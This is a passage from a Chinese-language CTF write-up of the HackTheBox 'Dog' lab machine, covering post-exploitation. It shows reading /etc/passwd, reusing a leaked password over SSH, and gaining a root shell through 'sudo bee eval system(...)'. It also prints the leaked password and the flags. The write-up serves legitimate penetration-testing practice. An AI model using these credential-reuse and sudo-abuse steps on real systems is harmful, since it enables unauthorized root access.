0.0.0.0:bootpc        0.0.0.0:*            \nudp   UNCONN  0       0        127.0.0.53%lo:domain        0.0.0.0:*            \ntcp   LISTEN  0       70           127.0.0.1:33060         0.0.0.0:*            \ntcp   LISTEN  0       151          127.0.0.1:mysql         0.0.0.0:*            \ntcp   LISTEN  0       4096     127.0.0.53%lo:domain        0.0.0.0:*            \ntcp   LISTEN  0       128            0.0.0.0:ssh           0.0.0.0:*            \ntcp   LISTEN  0       511                  *:http                *:*            \ntcp   LISTEN  0       128               [::]:ssh              [::]:*  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e之前有拿到一个数据库的账号密码，尝试进行mysql登录，但是会一直卡住\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@dog:/var/www/html/modules/shell$ mysql -u root -p\nmysql -u root -p\nEnter password: BackDropJ2024DS2024\n^[OP\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看\u003ccode\u003e/etc/passwd\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@dog:/var/www/html/modules/shell$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /etc/passwd\n\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /etc/passwd                                                               \nroot:x:0:0:root:/root:/bin/bash                                               \ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                             \nbin:x:2:2:bin:/bin:/usr/sbin/nologin                                          \nsys:x:3:3:sys:/dev:/usr/sbin/nologin                                          \n\u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e:x:4:65534:\u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e:/bin:/bin/sync                                            \ngames:x:5:60:games:/usr/games:/usr/sbin/nologin \nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin   \nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin           \nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin          \nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nroxy:x:13:13:proxy:/bin:/usr/sbin/nologin                                    \nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin                          \nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                                                                                             \ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin                                                                            \nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin                                                                       \nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin  \nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin                                                                    \nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin                              \n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin          \ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false                                                                                                  \nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin                                 \ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin        \nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin                     \npollinate:x:110:1::/var/cache/pollinate:/bin/false                            \nfwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin\nusbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin            \nsshd:x:113:65534::/run/sshd:/usr/sbin/nologin                                 \nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin            \njobert:x:1000:1000:jobert:/home/jobert:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\nmysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false\njohncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash\n_laurel:x:997:997::/var/log/laurel:/bin/false    \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们要当前目标用户是\u003ccode\u003ejobert\u003c/code\u003e和\u003ccode\u003ejohncusack\u003c/code\u003e ，权限问题无法查看其家目录内容\u003c/p\u003e\n\u003cp\u003e再尝试密码碰撞，使用\u003ccode\u003eBackDropJ2024DS2024\u003c/code\u003e ，使用用户\u003ccode\u003ejohncusack\u003c/code\u003e 成功碰撞…\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Dog  ssh johncusack@dog.htb\nThe authenticity of host \u003cspan class=\"hljs-string\"\u003e'dog.htb (10.10.11.58)'\u003c/span\u003e can\u003cspan class=\"hljs-string\"\u003e't be established.\nED25519 key fingerprint is SHA256:M3A+wMdtWP0tBPvp9OcRf6sPPmPmjfgNphodr912r1o. \nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '\u003c/span\u003edog.htb\u003cspan class=\"hljs-string\"\u003e' (ED25519) to the list of known hosts.\njohncusack@dog.htb'\u003c/span\u003es password:                                                \nWelcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)                                                                                           \n                                                                              \n * Documentation:  https://help.ubuntu.com                                                                                                                   \n * Management:     https://landscape.canonical.com  \n * Support:        https://ubuntu.com/pro       \n                                                                              \n System information as of Tue 04 Mar 2025 03:55:57 PM UTC  \n                                                                              \n  System load:           0.63                                                 \n  Usage of /:            55.6% of 6.32GB                 \n  Memory usage:          16%                                                  \n  Swap usage:            0%                                                   \n  Processes:             258                                                  \n  Users logged \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e:       0                                                    \n  IPv4 address \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e eth0: 10.10.11.58                                          \n  IPv6 address \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e eth0: dead:beef::250:56ff:feb9:b2de\n                                                                              \n                                                                              \nExpanded Security Maintenance \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e Applications is not enabled.\n                                                                              \n0 updates can be applied immediately.                                         \n                                                                              \nEnable ESM Apps to receive additional future security updates.        \nSee https://ubuntu.com/esm or run: \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e pro status                                                                                                           \n                                                                              \n                                                                              \njohncusack@dog:~$                                                         \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看权限，可以以root权限运行\u003ccode\u003ebee\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ejohncusack@dog:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\n[\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e] password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e johncusack: \nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e johncusack on dog:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser johncusack may run the following commands on dog:\n    (ALL : ALL) /usr/local/bin/bee\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ejohncusack@dog:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e bee             \n🐝 Bee                                 \nUsage: bee [global-options] \u0026#x3C;\u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e\u003e [options] [arguments]                                                                                                  \n                                                                                                                                                             \nGlobal Options:                                                               \n --root                                                                       \n Specify the root directory of the Backdrop installation to use. If not \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e, will try to find the Backdrop installation automatically based on the current di\nrectory.                                                                      \n                                                                              \n --site                \n Specify the directory name or URL of the Backdrop site to use (as defined \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'sites.php'\u003c/span\u003e). If not \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e, will try to find the Backdrop site automatically base\nd on the current directory.                                                   \n                                                                              \n --base-url                \n Specify the base URL of the Backdrop site, such as https://example.com. May be useful with commands that output URLs to pages on the site.\n                                                                              \n --\u003cspan class=\"hljs-built_in\"\u003eyes\u003c/span\u003e, -y                                                                    \n Answer \u003cspan class=\"hljs-string\"\u003e'yes'\u003c/span\u003e to questions without prompting.    \n --debug, -d                                                                  \n Enables \u003cspan class=\"hljs-string\"\u003e'debug'\u003c/span\u003e mode, \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ewhich\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'debug'\u003c/span\u003e and \u003cspan class=\"hljs-string\"\u003e'log'\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e messages will be displayed (\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e addition to all other messages).                                       \n                                       \n                                                                              \nCommands:                                                                     \n CONFIGURATION                                                                                                                                               \n  config-export                                                                                                                                              \n   cex, bcex                                                                  \n   Export config from the site.        \n                                       \n  config-get                           \n   cget                                                                                                                                                      \n   Get the value of a specific config option, or view all the config options \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e a given file.                                                                \n                                                                              \n  config-import                                                               \n   cim, bcim                                                                                                                                                 \n   Import config into the site.                                               \n                                                                              \n  config-set           \n   cset                                                                                                                                                      \n   Set the value of an option \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e a config file.                               \n                                                                              \n CORE                      \n  download-core                                                                                                                                              \n   dl-core                                                                    \n   Download Backdrop core.                                                    \n install                                                                     \n   si, site-install                                                           \n   Install Backdrop and setup a new site.                                                                                                                    \n                                       \n DATABASE                                                                     \n  db-drop                                                                     \n   sql-drop                                                                                                                                                  \n   Drop the current database and recreate an empty database with the same details. This could be used prior to import \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e the target database has more tables \nthan the \u003cspan class=\"hljs-built_in\"\u003esource\u003c/span\u003e database.                                                     \n                                       \n  db-export                            \n   dbex, db-dump, sql-export, sql-dump \n   Export the database as a compressed SQL file. This uses the --no-tablespaces option by default.                                                           \n                                                                                                                                                             \n  db-import                                                                   \n   dbim, sql-import                                                           \n   Import an SQL file into the current database.                                                                                                             \n                                                                              \n INFORMATION                                                                  \n  \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e                 \n   Provide \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e and examples \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'bee'\u003c/span\u003e and its commands.                                                                                                     \n                                                                              \n  \u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e                                                                         \n   ws, dblog, watchdog-show\n   Show database \u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e messages.                                                                                                                               \n                                                                              \n  status                                                                      \n   st, info, core-status                                                      \n   Provides an overview of the current Backdrop installation/site.           \n                                                                               \n  version                                                                                                                                                    \n   Display the current version of Bee. \n                                                                              \n MISCELLANEOUS                                                                \n  cache-clear                                                                                                                                                \n   cc                                                                                                                                                        \n   Clear a specific cache, or all Backdrop caches.                            \n                                       \n  cron                                 \n   Run cron.                           \n                                                                                                                                                             \n  maintenance-mode                                                                                                                                           \n   mm                                                                         \n   Enable or \u003cspan class=\"hljs-built_in\"\u003edisable\u003c/span\u003e maintenance mode \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e Backdrop.                           \n                                                                                                                                                             \n PROJECTS                                                                     \n  \u003cspan class=\"hljs-built_in\"\u003edisable\u003c/span\u003e                                                                     \n   dis, pm-disable     \n   Disable one or more projects (modules, themes, layouts).                                                                                                  \n                                                                              \n  download                                                                    \n   dl, pm-download         \n   Download Backdrop contrib projects.                                                                                                                       \n                                                                              \n  \u003cspan class=\"hljs-built_in\"\u003eenable\u003c/span\u003e                                                                      \n   en, pm-enable                                                              \n   Enable one or more projects (modules, themes, layouts).       \n\tprojects                                                                                                                                                   \n   pml, pmi, project, pm-list, pm-info \n   Display information about available projects (modules, themes, layouts).   \n                                                                              \n  uninstall                                                                                                                                                  \n   pmu, pm-uninstall                                                                                                                                         \n   Uninstall one or more modules.                                             \n                                       \n ROLES                                 \n  permissions                          \n   pls, permissions-list                                                                                                                                     \n   List all permissons of the modules.                                                                                                                       \n                                                                              \n  role-add-perm                                                               \n   rap                                                                                                                                                       \n   Grant specified permission(s) to a role.                                   \n                                                                              \n  role-create          \n   rcrt                                                                                                                                                      \n   Add a role.                                                                \n                                                                              \n  role-delete              \n   rdel                                                                                                                                                      \n   Delete a role.                                                             \n                                                                              \n  role-remove-perm                                                            \n   rrp          \n USERS                                                                                                                                                       \n  user-add-role                        \n   urole, urol                                                                \n   Add role to user.                                                          \n                                                                                                                                                             \n  user-block                                                                                                                                                 \n   ublk                                                                       \n   Block a user.                       \n                                       \n  user-cancel                          \n   ucan                                                                                                                                                      \n   Cancel/remove a user.                                                                                                                                     \n                                                                              \n  user-create                                                                 \n   ucrt                                                                                                                                                      \n   Create a user account with the specified name.                             \n                                                                              \n  user-login           \n   uli                                                                                                                                                       \n   Display a login \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e a given user.                                     \n                                                                              \n  user-password            \n   upw, upwd                                                                                                                                                 \n   Reset the login password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e a given user.                                 \n                                                                              \n  user-remove-role                                                            \n   urrole, urrol \n                                                                                                                                                              \n  user-unblock                         \n   uublk                                                                      \n   Unblock a user.                                                            \n                                                                                                                                                             \n  \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e                                                                                                                                                      \n   uls, user-list                                                             \n   List all user accounts.             \n                                       \n ADVANCED                              \n  db-query                                                                                                                                                   \n   dbq                                                                                                                                                       \n   Execute a query using db_query().                                          \n                                                                              \n  \u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e                                                                                                                                                       \n   ev, php-eval                                                               \n   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.    \n                                       \n  php-script                                                                                                                                                 \n   scr                                                                        \n   Execute an arbitrary PHP file after bootstrapping Backdrop.                \n                                       \n  sql                                                                                                                                                        \n   sqlc, sql-cli, db-cli                                                      \n   Open an SQL command-line interface using Backdrop\u003cspan class=\"hljs-string\"\u003e's database credentials.  \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e对参数进行测试，通过以下命令成功以\u003ccode\u003eroot\u003c/code\u003e身份命令执行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ejohncusack@dog:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e bee --root=/var/www/html \u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"system(id)\"\u003c/span\u003e\n\n ⚠  Warning: Use of undefined constant \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e - assumed \u003cspan class=\"hljs-string\"\u003e'id'\u003c/span\u003e (this will throw an Error \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e a future version of PHP)\n\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e() (line 1 of /backdrop_tool/bee/commands/php.bee.inc(51) : \u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e()\u003cspan class=\"hljs-string\"\u003e'd code).\n\nuid=0(root) gid=0(root) groups=0(root)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得\u003ccode\u003eroot shell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ejohncusack@dog:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e bee --root=/var/www/html \u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"system('/bin/bash')\"\u003c/span\u003e\nroot@dog:/var/www/html# \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eFlag\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@dog:/var/www/html# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /home/johncusack/user.txt \nfb94f5fef9c1ed963af3eeccffb86867\nroot@dog:/var/www/html# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /root/root.txt \n4b4e17fb473d44908a538e2f99b27e8d\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003egit泄露，后台文件上传利用，上传点不好找，还有就是密码碰撞，下次将密码碰撞优先级提高一些\u003c/p\u003e","title":"HackTheBox - Season7-Dog","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["HackTheBox","Linux靶机"],"categories":"靶机","description":"Season7 Dog https://app.hackthebox.com/machines/Dog | esay 前期踩点 10.10.11.58是靶机，进行nmap扫描 扫描出来.git文件夹，那么可能存在git泄露；robots.txt文件 访问HTTP并收集指纹 在主页about中发现域名..."},"recentPosts":[{"id":"念念碎","title":"念念碎","date":"2025-10-26","isEncrypted":false,"year":"2025","month":"10","day":"26"},{"id":"HackMyVMSysadmin","title":"HackMyVM - Sysadmin","date":"2025-10-25","isEncrypted":false,"year":"2025","month":"10","day":"25"},{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"},{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs - LavaShop","date":"2025-10-20","isEncrypted":false,"year":"2025","month":"10","day":"20"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"04","day":"04","id":"HackTheBoxSeason7-Dog"},"buildId":"KmitjrrO37Sagt1EDlr-i","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>